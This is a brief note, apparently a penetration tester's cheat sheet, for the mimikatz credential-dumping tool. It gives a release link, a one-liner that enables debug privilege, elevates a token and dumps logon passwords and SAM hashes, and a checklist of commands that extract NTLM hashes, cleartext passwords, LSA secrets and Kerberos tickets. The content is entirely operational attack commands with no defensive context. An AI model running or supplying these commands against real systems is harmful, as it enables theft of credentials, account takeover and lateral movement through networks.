https://github.com/gentilkiwi/mimikatz/releases

one-liner:
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```
Checklist:
```
privilege::debug

sekurlsa::logonpasswords OR sekurlsa::msv -- ntlm hashes for passwords which can be passed around and also cleartext passwords sometimes

lsadump::lsa /inject -- to get lsa passwords

lsadump::sam OR lsadump::sam /patch -- to dump SAM hashes

lsadump::secrets -- to dump lsa secrets

lsadump::lsa /patch -- to dump local security authority logon sessions

sekurlsa::tickets /export -- to get tickets
```